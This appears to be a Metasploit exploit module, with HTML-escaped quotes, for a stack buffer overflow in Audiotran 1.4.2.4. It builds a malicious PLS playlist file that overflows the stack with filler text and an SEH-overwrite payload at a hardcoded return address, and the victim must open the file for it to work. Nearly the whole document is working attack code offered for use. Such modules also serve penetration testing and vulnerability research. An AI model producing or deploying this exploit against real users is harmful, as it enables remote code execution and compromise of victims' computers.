 
class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking
 
  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Audiotran PLS File Stack Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a stack-based buffer overflow in Audiotran 1.4.2.4.
        An attacker must send the file to victim and the victim must open the file.
        Alternatively, it may be possible to execute code remotely via an embedded
        PLS file within a browser when the PLS extention is registered to Audiotran.
        This alternate vector has not been tested and cannot be exercised directly
        with this module.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;    =>
        [
          &#039;Philip OKeefe&#039;,
        ],
      &#039;References&#039;     =>
        [
          [ &#039;EDB&#039;, &#039;14961&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 5000,
          &#039;BadChars&#039; => "\x00\x0a\x0d\x3d",
          &#039;StackAdjustment&#039; => -3500,
        },
      &#039;Platform&#039; => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Windows Universal&#039;, { &#039;Ret&#039; => 0x1001cd67 } ], #p/p/r from amp3dj.ocx
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Sep 09 2010&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
      register_options(
        [
          OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;msf.pls&#039;]),
        ], self.class)
  end
 
  def exploit
    sploit = "[playlist]\r\nFile1="
    sploit << rand_text_alpha_upper(1940)
    sploit << generate_seh_payload(target.ret)
    print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
    file_create(sploit)
  end
end

